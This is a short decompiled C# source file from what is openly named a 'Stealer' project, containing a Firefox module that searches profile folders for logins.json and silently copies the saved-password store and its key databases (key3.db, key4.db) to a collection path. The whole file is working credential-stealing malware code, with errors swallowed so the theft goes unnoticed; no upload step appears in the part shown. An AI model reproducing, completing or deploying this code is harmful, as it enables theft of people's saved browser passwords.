using System;
using System.IO;

namespace Stealer.Firefox
{
	// Token: 0x02000029 RID: 41
	internal sealed class cLogins
	{
		// Token: 0x060000BE RID: 190 RVA: 0x00006E80 File Offset: 0x00005080
		private static void CopyDatabaseFile(string from, string sSavePath)
		{
			try
			{
				if (File.Exists(from))
				{
					File.Copy(from, sSavePath + "\\" + Path.GetFileName(from));
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000BF RID: 191 RVA: 0x00006EC4 File Offset: 0x000050C4
		public static void GetDBFiles(string path, string sSavePath)
		{
			if (!Directory.Exists(path))
			{
				return;
			}
			string[] files = Directory.GetFiles(path, "logins.json", SearchOption.AllDirectories);
			if (files == null)
			{
				return;
			}
			foreach (string path2 in files)
			{
				foreach (string path3 in cLogins.keyFiles)
				{
					cLogins.CopyDatabaseFile(Path.Combine(Path.GetDirectoryName(path2), path3), sSavePath);
				}
			}
		}

		// Token: 0x0400005C RID: 92
		private static string[] keyFiles = new string[]
		{
			"key3.db",
			"key4.db",
			"logins.json"
		};
	}
}
